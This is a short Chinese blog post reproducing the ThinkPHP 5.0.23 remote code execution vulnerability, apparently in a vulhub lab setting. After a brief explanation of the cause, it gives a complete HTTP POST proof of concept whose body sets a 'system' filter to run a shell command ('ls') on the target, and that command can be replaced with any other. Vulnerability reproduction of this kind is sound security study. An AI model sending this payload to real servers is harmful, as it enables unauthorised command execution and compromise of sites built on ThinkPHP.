---
title: ThinkPHP5 5.0.23 远程代码执行漏洞
date: 2020-06-14 13:42:51
categories: 漏洞复现
tags: ThinkPHP
---

#### 背景

ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。

<!--more-->

####  复现过程

发送如下POC

```http
POST /index.php?s=captcha HTTP/1.1
Host: IP:端口
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
```

![](http://qn.laohuan.xin/2020-06-14_13-39-28.png)

#### 参考链接

<http://github.com/vulhub/vulhub/blob/master/thinkphp/5.0.23-rce/README.zh-cn.md/>